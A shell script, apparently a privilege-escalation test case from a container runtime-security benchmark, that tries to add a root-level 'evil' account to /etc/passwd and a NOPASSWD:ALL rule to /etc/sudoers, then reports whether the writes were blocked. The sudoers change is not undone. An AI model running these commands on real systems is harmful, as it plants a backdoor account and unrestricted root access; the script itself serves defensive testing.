#!/usr/bin/env sh
# Tactic: Privilege Escalation (TA0004)
# Technique: Abuse Elevation Control Mechanism - Sudo and Sudo Caching
#            (T1548.003); Account Manipulation (T1098)
# Attack: append a rogue account to /etc/passwd and a NOPASSWD rule to
# /etc/sudoers. nginx never modifies these files at runtime.
# Marker: outcome=allowed if either write succeeded, blocked if both prevented.
set -u
TAG="15-write-passwd-sudoers"
KIND="attack"
ok=1
CP="/tmp/.passwd.bak"
cp /etc/passwd "$CP" 2>/dev/null || true
{ echo 'evil:x:0:0:evil:/root:/bin/sh' >> /etc/passwd; } 2>/dev/null && ok=0
{ echo 'evil ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers; } 2>/dev/null && ok=0
# Restore /etc/passwd so the pod stays reusable.
if [ -f "$CP" ]; then cp "$CP" /etc/passwd 2>/dev/null || true; rm -f "$CP" 2>/dev/null || true; fi
if [ "$ok" -eq 0 ]; then OUT="allowed"; else OUT="blocked"; fi
printf 'BENCH_RESULT tag=%s kind=%s outcome=%s rc=%s\n' "$TAG" "$KIND" "$OUT" "$ok"
